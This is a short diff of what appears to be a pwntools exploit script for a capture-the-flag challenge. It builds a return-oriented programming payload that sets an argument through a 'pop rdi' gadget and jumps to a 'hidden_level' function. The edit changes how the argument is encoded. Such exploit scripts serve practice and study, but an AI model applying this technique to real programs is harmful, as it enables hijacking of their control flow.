@@ -22,7 +22,7 @@ log.info(f"setvbuf got -> {hex(elf.got['setvbuf'])}")
 payload = flat(
     p64(0),
     p64(rop.find_gadget(["pop rdi", "ret"]).address),
-    p64(0xdeadbeef),
+    p64(-0x21524111, sign="signed"),
     p64(elf.symbols["hidden_level"])
 )
 p.sendlineafter(b"first input please: ", payload)
